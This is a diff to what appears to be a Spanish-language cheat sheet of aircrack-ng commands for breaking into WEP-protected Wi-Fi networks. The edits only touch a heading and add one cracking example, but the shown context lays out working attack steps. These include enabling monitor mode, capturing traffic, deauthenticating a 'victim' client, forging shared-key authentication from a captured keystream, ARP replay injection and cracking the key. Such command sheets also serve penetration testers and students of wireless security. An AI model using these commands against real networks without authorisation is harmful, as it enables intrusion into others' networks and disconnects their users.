@@ -57,7 +57,7 @@ aireplay-ng -2 -b <bssid_AP> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0mon (Int
 aircrack-ng -z <file .cap>
 (aircrack-ng -0 -z -n 64 wep.cap) video
 
-# ELUDIR LA AUTENTICACION DE CLAVE COMPARTDA WEP
+# ELUDIR LA AUTENTICACION DE CLAVE COMPARTDA WEP (PSK)
 airmon-ng start wlan0
 airodump-ng -c <canal> --bssid <bssid_AP> -w <save_file> wlan0mon
 aireplay-ng -0 1 -a <bssid_AP> -c <MAC VICTIM> wlan0mon
@@ -65,7 +65,7 @@ aireplay-ng -1 0 -e <essid_AP> -y <.XOR FILENAME> -a <bssid_AP> -h <mac_wlan0mon
 aireplay-ng -3 -b <bssid_AP> -h <MAC_wlan0mon> wlan0mon
 aireplay-ng -0 1 -a <bssid_AP> -c <MAC VICTIM> wlan0mon
 aircrack-ng <file .cap>
-
+(aircrack-ng -0 -z -n 64 file.cap) video40
 
 
 # RED WEP SIN CLIENTES AUTENTICACION ABIERTA (CHOP-CHOP) 
